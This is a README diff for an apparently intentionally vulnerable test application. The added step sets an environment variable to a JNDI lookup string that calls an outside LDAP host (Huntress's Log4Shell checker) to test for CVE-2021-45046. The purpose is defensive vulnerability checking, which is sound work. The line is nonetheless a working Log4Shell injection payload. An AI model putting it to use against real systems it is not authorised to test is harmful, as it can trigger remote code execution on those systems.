@@ -48,5 +48,7 @@ For internal testing within this branch is an application version that is affect
 To run the test:
 1. get ID from [Huntress](https://log4shell.huntress.com/)
 1. set environment variable `LOGGING_CHECK`: `export LOGGING_CHECK="ID-from-Huntress"`
+1. set environment variable `LOGGING_CHECK_45046` to check for CVE-2021-45046:
+   `export LOGGING_CHECK_45046="\${jndi:ldap://log4shell.huntress.com:1389/ID-from-Huntress}"`
 1. run app: `bash run.sh`
 1. check the Huntress results
